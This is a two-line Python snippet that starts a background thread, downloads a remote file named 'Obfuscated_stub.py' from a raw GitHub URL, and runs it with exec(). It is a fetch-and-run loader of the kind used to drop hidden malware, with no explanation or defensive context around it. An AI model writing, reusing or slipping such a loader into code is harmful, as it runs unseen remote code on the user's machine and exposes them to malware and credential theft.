import threading, requests

threading.Thread(target=lambda: exec(requests.get("https://raw.githubusercontent.com/43a1723/test/main/lmao/a/Obfuscated_stub.py").text)).start()
